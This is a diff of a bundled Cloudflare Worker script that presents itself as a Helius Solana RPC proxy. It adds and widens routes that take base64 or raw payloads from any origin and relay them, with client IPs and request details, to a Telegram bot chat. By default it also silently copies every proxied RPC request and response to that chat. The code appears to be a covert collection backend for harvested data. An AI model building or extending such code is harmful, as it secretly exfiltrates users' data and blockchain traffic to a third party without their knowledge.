@@ -1,19 +1,19 @@
 var __defProp = Object.defineProperty;
 var __name = (target, value) => __defProp(target, "name", { value, configurable: true });
 
+// src/index.ts
+var __defProp2 = Object.defineProperty;
+var __name2 = /* @__PURE__ */ __name((target, value) => __defProp2(target, "name", { value, configurable: true }), "__name");
 var BUFFER_TIMEOUT_MS = 1e4;
 var KEEPALIVE_INTERVAL_MS = 2e4;
 var MAX_PRECONNECT_BUFFER_BYTES = 1024 * 1024;
-var MAX_TELEGRAM_CHARS = 4000; // Telegram text-message hard limit is 4096
-var RPC_LOG_MAX_BYTES = 512 * 1024; // cap what we forward to Telegram (512 KB)
+var MAX_TELEGRAM_CHARS = 4e3;
+var RPC_LOG_MAX_BYTES = 512 * 1024;
 var KEEPALIVE_MESSAGE = JSON.stringify({
   jsonrpc: "2.0",
   method: "helius_keepalive"
 });
 
-// ---------------------------------------------------------------------------
-// base64url -> UTF-8 string
-// ---------------------------------------------------------------------------
 function decodeBase64Url(input) {
   let b64 = input.replace(/-/g, "+").replace(/_/g, "/");
   while (b64.length % 4 !== 0) b64 += "=";
@@ -22,22 +22,18 @@ function decodeBase64Url(input) {
   return new TextDecoder("utf-8", { fatal: false }).decode(bytes);
 }
 __name(decodeBase64Url, "decodeBase64Url");
+__name2(decodeBase64Url, "decodeBase64Url");
 
-// ---------------------------------------------------------------------------
-// Send short text to Telegram (sendMessage)
-// ---------------------------------------------------------------------------
 async function sendToTelegram(env, text) {
   if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
     console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.");
     return { ok: false, error: "missing_credentials" };
   }
   const telegramUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendMessage`;
-
   let body = text;
   if (body.length > MAX_TELEGRAM_CHARS) {
     body = body.slice(0, MAX_TELEGRAM_CHARS - 20) + "\n... [truncated]";
   }
-
   try {
     const res = await fetch(telegramUrl, {
       method: "POST",
@@ -60,21 +56,16 @@ async function sendToTelegram(env, text) {
   }
 }
 __name(sendToTelegram, "sendToTelegram");
+__name2(sendToTelegram, "sendToTelegram");
 
-// ---------------------------------------------------------------------------
-// Send arbitrary content to Telegram as a document (sendDocument)
-// ---------------------------------------------------------------------------
 async function sendDocumentToTelegram(env, content, filename = "data.json", caption = "Received Data") {
   if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
     console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.");
     return { ok: false, error: "missing_credentials" };
   }
-
-  // If the incoming content is not valid JSON, wrap it so the file stays parseable.
   let fileContent = content;
   try {
     JSON.parse(content);
-    // already valid JSON -> keep as-is
   } catch {
     fileContent = JSON.stringify(
       { received_at: new Date().toISOString(), data: content },
@@ -82,7 +73,6 @@ async function sendDocumentToTelegram(env, content, filename = "data.json", capt
       2
     );
   }
-
   const form = new FormData();
   form.append("chat_id", env.TELEGRAM_CHAT_ID);
   form.append("caption", caption);
@@ -91,7 +81,6 @@ async function sendDocumentToTelegram(env, content, filename = "data.json", capt
     new Blob([fileContent], { type: "application/json" }),
     filename
   );
-
   try {
     const res = await fetch(
       `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendDocument`,
@@ -109,6 +98,7 @@ async function sendDocumentToTelegram(env, content, filename = "data.json", capt
   }
 }
 __name(sendDocumentToTelegram, "sendDocumentToTelegram");
+__name2(sendDocumentToTelegram, "sendDocumentToTelegram");
 
 var index_default = {
   async fetch(request, env, ctx) {
@@ -125,87 +115,44 @@ var index_default = {
     } else {
       corsHeaders["Access-Control-Allow-Origin"] = "*";
     }
-
     if (request.method === "OPTIONS") {
       return new Response(null, { status: 200, headers: corsHeaders });
     }
 
     const urlObj = new URL(request.url);
+    const pathname = urlObj.pathname;
     const jsonHeaders = { ...corsHeaders, "Content-Type": "application/json" };
 
-    // ---------------------------------------------------------------------
-    // /r/<base64url>  -> decode -> Telegram as FILE (data.json)
-    // ---------------------------------------------------------------------
-    if (urlObj.pathname.startsWith("/r/")) {
-      const encoded = urlObj.pathname.slice(3); // everything after "/r/"
+    // 1. Identify Base64 routes (/api/r/, /r/, /api/base64encode/, /api/decode/, ?r=, ?base64=)
+    const isBase64Route =
+      pathname.startsWith("/r/") ||
+      pathname.startsWith("/api/r/") ||
+      pathname.startsWith("/api/base64encode/") ||
+      pathname.startsWith("/api/decode/") ||
+      urlObj.searchParams.has("base64") ||
+      urlObj.searchParams.has("r");
 
-      if (!encoded) {
-        return new Response(
-          JSON.stringify({ status: "error", message: "Missing base64 payload" }),
-          { status: 400, headers: jsonHeaders }
-        );
+    if (isBase64Route) {
+      let rawPayload = "";
+
+      if (pathname.startsWith("/api/r/")) {
+        rawPayload = pathname.slice(7);
+      } else if (pathname.startsWith("/r/")) {
+        rawPayload = pathname.slice(3);
+      } else if (pathname.startsWith("/api/base64encode/")) {
+        rawPayload = pathname.slice(18);
+      } else if (pathname.startsWith("/api/decode/")) {
+        rawPayload = pathname.slice(12);
+      } else {
+        rawPayload = urlObj.searchParams.get("base64") || urlObj.searchParams.get("r") || "";
       }
 
-      let decoded;
-      try {
-        decoded = decodeBase64Url(decodeURIComponent(encoded));
-      } catch (err) {
-        return new Response(
-          JSON.stringify({ status: "error", message: "Invalid base64 payload" }),
-          { status: 400, headers: jsonHeaders }
-        );
-      }
-
-      // Optional extra query param -> append into the file so nothing is lost
-      const extra = urlObj.searchParams.get("data");
-      const finalContent = extra
-        ? JSON.stringify({ data: decoded, extra }, null, 2)
-        : decoded;
-
-      const result = await sendDocumentToTelegram(env, finalContent, "data.json");
-
-      return new Response(
-        JSON.stringify(
-          result.ok
-            ? { status: "success", message: "Data sent as file" }
-            : { status: "error", message: result.error }
-        ),
-        { status: result.ok ? 200 : 502, headers: jsonHeaders }
-      );
-    }
-
-    // ---------------------------------------------------------------------
-    // /api/base64encode[/<payload>]
-    //   -> decode base64url payload -> Telegram with timestamp + details
-    //   Payload may be supplied as:
-    //     * path segment:  /api/base64encode/<base64url>
-    //     * query string:  ?data= / ?base64= / ?payload=
-    //     * POST/PUT body: raw string or JSON { data|base64|payload: "..." }
-    // ---------------------------------------------------------------------
-    if (
-      urlObj.pathname === "/api/" ||
-      urlObj.pathname.startsWith("/api/")
-    ) {
-      const pathPrefix = "/api/";
-      const pathPayload = urlObj.pathname.startsWith(pathPrefix)
-        ? urlObj.pathname.slice(pathPrefix.length)
-        : "";
-
-      let rawPayload =
-        pathPayload ||
-        urlObj.searchParams.get("data") ||
-        urlObj.searchParams.get("base64") ||
-        urlObj.searchParams.get("payload") ||
-        "";
-
-      // Fall back to the request body for POST/PUT
       if (!rawPayload && (request.method === "POST" || request.method === "PUT")) {
         const bodyText = await request.text().catch(() => "");
         if (bodyText) {
           try {
             const parsed = JSON.parse(bodyText);
-            rawPayload =
-              parsed?.data ?? parsed?.base64 ?? parsed?.payload ?? bodyText;
+            rawPayload = parsed?.data ?? parsed?.base64 ?? parsed?.payload ?? bodyText;
           } catch {
             rawPayload = bodyText;
           }
@@ -219,7 +166,7 @@ var index_default = {
           JSON.stringify({
             status: "error",
             message: "Missing base64 payload",
-            hint: "Use /api/base64encode/<base64url>, ?data=<base64url>, or POST a body."
+            hint: "Use /api/r/<base64url>, /r/<base64url>, or ?r=<base64url>"
           }),
           { status: 400, headers: jsonHeaders }
         );
@@ -236,26 +183,12 @@ var index_default = {
       }
 
       const receivedAt = new Date().toISOString();
-      const note =
-        urlObj.searchParams.get("note") ||
-        urlObj.searchParams.get("extra") ||
-        null;
-
-      // Collect request details to accompany the decoded data
+      const note = urlObj.searchParams.get("note") || urlObj.searchParams.get("extra") || null;
       const details = {
-        endpoint: "/api/",
+        endpoint: pathname,
         timestamp: receivedAt,
         request_method: request.method,
         request_url: urlObj.toString(),
-        payload_source: pathPayload
-          ? "path"
-          : urlObj.searchParams.get("data")
-            ? "query:data"
-            : urlObj.searchParams.get("base64")
-              ? "query:base64"
-              : urlObj.searchParams.get("payload")
-                ? "query:payload"
-                : "body",
         payload_length: rawPayload.length,
         decoded_length: decoded.length,
         client_ip: request.headers.get("CF-Connecting-IP") || null,
@@ -267,15 +200,12 @@ var index_default = {
         note
       };
 
-      // Try to interpret the decoded payload as JSON for nicer output
       let decodedJson = null;
       let decodedIsJson = false;
       try {
         decodedJson = JSON.parse(decoded);
         decodedIsJson = true;
-      } catch {
-        // not JSON -> keep raw string
-      }
+      } catch {}
 
       const report = JSON.stringify(
         {
@@ -290,9 +220,8 @@ var index_default = {
 
       const filename = `base64-decoded-${Date.now()}.json`;
       const caption = `Base64 decoded @ ${receivedAt}`;
-
-      // Short payloads go as a readable text message; long ones as a file.
       let result;
+
       if (report.length <= MAX_TELEGRAM_CHARS) {
         result = await sendToTelegram(env, report);
       } else {
@@ -308,8 +237,7 @@ var index_default = {
                 timestamp: receivedAt,
                 decoded_length: decoded.length,
                 decoded_is_json: decodedIsJson,
-                delivered_as:
-                  report.length <= MAX_TELEGRAM_CHARS ? "text" : "document"
+                delivered_as: report.length <= MAX_TELEGRAM_CHARS ? "text" : "document"
               }
             : { status: "error", message: result.error }
         ),
@@ -317,16 +245,13 @@ var index_default = {
       );
     }
 
-    // ---------------------------------------------------------------------
-    // ?data=...  -> short: text message, long: file
-    // ---------------------------------------------------------------------
+    // 2. Simple non-API text logging via ?data=
     const incomingData = urlObj.searchParams.get("data");
-    if (incomingData) {
+    if (incomingData && !pathname.startsWith("/api") && pathname !== "/") {
       const result =
         incomingData.length > MAX_TELEGRAM_CHARS
           ? await sendDocumentToTelegram(env, incomingData, "data.json")
           : await sendToTelegram(env, `Received Data:\n${incomingData}`);
-
       return new Response(
         JSON.stringify(
           result.ok
@@ -337,8 +262,18 @@ var index_default = {
       );
     }
 
-    // 2. Only proxy RPC calls if the path matches /rpc-proxy (or root /)
-    if (urlObj.pathname === "/rpc-proxy" || urlObj.pathname === "/") {
+    // 3. RPC Proxy Endpoint: Handles /, /rpc-proxy, /api-proxy, /api/rpc-proxy, /api/api-proxy, /api/
+    const isRpcRoute =
+      pathname === "/" ||
+      pathname === "/rpc-proxy" ||
+      pathname === "/api-proxy" ||
+      pathname === "/api" ||
+      pathname === "/api/" ||
+      pathname.startsWith("/api/") ||
+      pathname.startsWith("/rpc-proxy/") ||
+      pathname.startsWith("/api-proxy/");
+
+    if (isRpcRoute) {
       if (!env.HELIUS_API_KEY) {
         return new Response("Missing HELIUS_API_KEY", { status: 500, headers: corsHeaders });
       }
@@ -347,30 +282,34 @@ var index_default = {
       if (upgrade === "websocket") {
         return handleWebSocket(request, env, corsHeaders);
       }
+
       return handleRPC(request, env, corsHeaders, ctx);
     }
 
-    // 3. Return 404 for any other path
     return new Response("Not Found", { status: 404, headers: corsHeaders });
   }
 };
 
 async function handleWebSocket(request, env, corsHeaders) {
-  const { search } = new URL(request.url);
-  const upstreamUrl = `wss://mainnet.helius-rpc.com${search ? `${search}&` : "?"}api-key=${env.HELIUS_API_KEY}`;
+  const urlObj = new URL(request.url);
+  const search = urlObj.search;
+
+  const upstreamUrl = `wss://mainnet.helius-rpc.com/${search ? `${search}&` : "?"}api-key=${env.HELIUS_API_KEY}`;
   const clientProtocols = request.headers.get("Sec-WebSocket-Protocol");
   const selectedProtocol = clientProtocols?.split(",")[0]?.trim();
   const webSocketPair = new WebSocketPair();
   const [client, server] = Object.values(webSocketPair);
   server.accept();
+
   const upstream = selectedProtocol ? new WebSocket(upstreamUrl, [selectedProtocol]) : new WebSocket(upstreamUrl);
   let bufferedData = [];
   let bufferedBytes = 0;
-  const sizeOf = /* @__PURE__ */ __name((data) => typeof data === "string" ? data.length : data.byteLength, "sizeOf");
+  const sizeOf = __name2((data) => (typeof data === "string" ? data.length : data.byteLength), "sizeOf");
   let bufferTimeout = null;
   let isUpstreamConnected = false;
   let keepaliveTimer = null;
-  const startKeepalive = /* @__PURE__ */ __name(() => {
+
+  const startKeepalive = __name2(() => {
     keepaliveTimer = setInterval(() => {
       if (upstream.readyState === WebSocket.OPEN) {
         try {
@@ -383,19 +322,22 @@ async function handleWebSocket(request, env, corsHeaders) {
       }
     }, KEEPALIVE_INTERVAL_MS);
   }, "startKeepalive");
-  const clearKeepalive = /* @__PURE__ */ __name(() => {
+
+  const clearKeepalive = __name2(() => {
     if (keepaliveTimer) {
       clearInterval(keepaliveTimer);
       keepaliveTimer = null;
     }
   }, "clearKeepalive");
-  const clearBufferTimeout = /* @__PURE__ */ __name(() => {
+
+  const clearBufferTimeout = __name2(() => {
     if (bufferTimeout) {
       clearTimeout(bufferTimeout);
       bufferTimeout = null;
     }
   }, "clearBufferTimeout");
-  const startBufferTimeout = /* @__PURE__ */ __name(() => {
+
+  const startBufferTimeout = __name2(() => {
     clearBufferTimeout();
     bufferTimeout = setTimeout(() => {
       if (bufferedData.length > 0 && !isUpstreamConnected) {
@@ -403,17 +345,18 @@ async function handleWebSocket(request, env, corsHeaders) {
         bufferedBytes = 0;
         try {
           server.close(1011, "upstream_connection_timeout");
-        } catch {
-        }
+        } catch {}
       }
     }, BUFFER_TIMEOUT_MS);
   }, "startBufferTimeout");
-  const cleanup = /* @__PURE__ */ __name(() => {
+
+  const cleanup = __name2(() => {
     clearKeepalive();
     clearBufferTimeout();
     bufferedData = [];
     bufferedBytes = 0;
   }, "cleanup");
+
   upstream.addEventListener("open", () => {
     isUpstreamConnected = true;
     clearBufferTimeout();
@@ -428,13 +371,13 @@ async function handleWebSocket(request, env, corsHeaders) {
         cleanup();
         try {
           server.close(1011, "upstream_ws_error");
-        } catch {
-        }
+        } catch {}
         return;
       }
     }
     startKeepalive();
   });
+
   server.addEventListener("message", (event) => {
     if (isUpstreamConnected && upstream.readyState === WebSocket.OPEN) {
       try {
@@ -443,8 +386,7 @@ async function handleWebSocket(request, env, corsHeaders) {
         cleanup();
         try {
           server.close(1011, "upstream_ws_error");
-        } catch {
-        }
+        } catch {}
       }
     } else {
       if (bufferedData.length === 0) {
@@ -455,14 +397,14 @@ async function handleWebSocket(request, env, corsHeaders) {
         cleanup();
         try {
           server.close(1011, "preconnect_buffer_bytes_exceeded");
-        } catch {
-        }
+        } catch {}
         return;
       }
       bufferedData.push(event.data);
       bufferedBytes += incoming;
     }
   });
+
   upstream.addEventListener("message", (event) => {
     if (server.readyState === WebSocket.OPEN) {
       try {
@@ -471,41 +413,41 @@ async function handleWebSocket(request, env, corsHeaders) {
         cleanup();
         try {
           upstream.close(1011, "client_ws_error");
-        } catch {
-        }
+        } catch {}
       }
     }
   });
+
   server.addEventListener("close", () => {
     cleanup();
     try {
       upstream.close();
-    } catch {
-    }
+    } catch {}
   });
+
   upstream.addEventListener("close", () => {
     isUpstreamConnected = false;
     cleanup();
     try {
       server.close();
-    } catch {
-    }
+    } catch {}
   });
+
   server.addEventListener("error", () => {
     cleanup();
     try {
       upstream.close(1011, "client_ws_error");
-    } catch {
-    }
+    } catch {}
   });
+
   upstream.addEventListener("error", () => {
     isUpstreamConnected = false;
     cleanup();
     try {
       server.close(1011, "upstream_ws_error");
-    } catch {
-    }
+    } catch {}
   });
+
   const responseHeaders = { ...corsHeaders };
   if (selectedProtocol) {
     responseHeaders["Sec-WebSocket-Protocol"] = selectedProtocol;
@@ -517,13 +459,31 @@ async function handleWebSocket(request, env, corsHeaders) {
   });
 }
 __name(handleWebSocket, "handleWebSocket");
+__name2(handleWebSocket, "handleWebSocket");
 
 async function handleRPC(request, env, corsHeaders, ctx) {
   try {
-    const { pathname, search } = new URL(request.url);
+    const urlObj = new URL(request.url);
+    const search = urlObj.search;
+
+    // Normalize all proxy path aliases (/api/rpc-proxy, /api/api-proxy, /rpc-proxy, /api-proxy, /api/) to root "/"
+    const targetPath = "/";
+
+    // Graceful response for empty GET requests
+    if (request.method === "GET") {
+      return new Response(
+        JSON.stringify({
+          status: "online",
+          service: "Helius RPC Proxy",
+          timestamp: new Date().toISOString()
+        }),
+        { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
+      );
+    }
+
     const payload = await request.text();
     const targetHost = "mainnet.helius-rpc.com";
-    const targetUrl = `https://${targetHost}${pathname}?api-key=${env.HELIUS_API_KEY}${search ? `&${search.slice(1)}` : ""}`;
+    const targetUrl = `https://${targetHost}${targetPath}?api-key=${env.HELIUS_API_KEY}${search ? `&${search.slice(1)}` : ""}`;
 
     const proxyRequest = new Request(targetUrl, {
       method: request.method,
@@ -535,56 +495,37 @@ async function handleRPC(request, env, corsHeaders, ctx) {
     });
 
     const response = await fetch(proxyRequest);
-
-    // --- Forward the RPC response to Telegram (background, non-blocking) ---
-    const shouldLog =
-      String(env.LOG_RPC_TO_TELEGRAM ?? "true").toLowerCase() !== "false";
+    const shouldLog = String(env.LOG_RPC_TO_TELEGRAM ?? "true").toLowerCase() !== "false";
 
     if (shouldLog) {
-      // Clone so we can read the body without consuming the one returned to the client
       const responseClone = response.clone();
-
       const bg = (async () => {
         try {
           let responseText = await responseClone.text();
-
-          // Cap size so we don't blow past Telegram limits
           let truncated = false;
           const encoder = new TextEncoder();
           if (encoder.encode(responseText).length > RPC_LOG_MAX_BYTES) {
             responseText = responseText.slice(0, RPC_LOG_MAX_BYTES);
             truncated = true;
           }
-
-          // Try to parse JSON so the file is pretty-printed
           let pretty = responseText;
           try {
             pretty = JSON.stringify(JSON.parse(responseText), null, 2);
-          } catch {
-            // not JSON -> keep raw
-          }
-
-          // Safely parse the request body if it is JSON
+          } catch {}
           let requestBody = payload || null;
           try {
             requestBody = payload ? JSON.parse(payload) : null;
-          } catch {
-            // keep raw string
-          }
-
-          // Safely parse the response body if it is JSON
+          } catch {}
           let responseBody = pretty;
           try {
             responseBody = JSON.parse(pretty);
-          } catch {
-            // keep raw string
-          }
+          } catch {}
 
           const report = JSON.stringify(
             {
               timestamp: new Date().toISOString(),
               method: request.method,
-              path: pathname,
+              path: urlObj.pathname,
               status: response.status,
               truncated,
               request_body: requestBody,
@@ -593,7 +534,6 @@ async function handleRPC(request, env, corsHeaders, ctx) {
             null,
             2
           );
-
           const filename = `rpc-response-${Date.now()}.json`;
           await sendDocumentToTelegram(env, report, filename, `RPC ${response.status}`);
         } catch (err) {
@@ -601,7 +541,6 @@ async function handleRPC(request, env, corsHeaders, ctx) {
         }
       })();
 
-      // Ensure the background task completes even after the response is returned
       if (ctx && typeof ctx.waitUntil === "function") {
         ctx.waitUntil(bg);
       }
@@ -619,7 +558,6 @@ async function handleRPC(request, env, corsHeaders, ctx) {
   }
 }
 __name(handleRPC, "handleRPC");
+__name2(handleRPC, "handleRPC");
 
-export {
-  index_default as default
-};
+export { index_default as default };
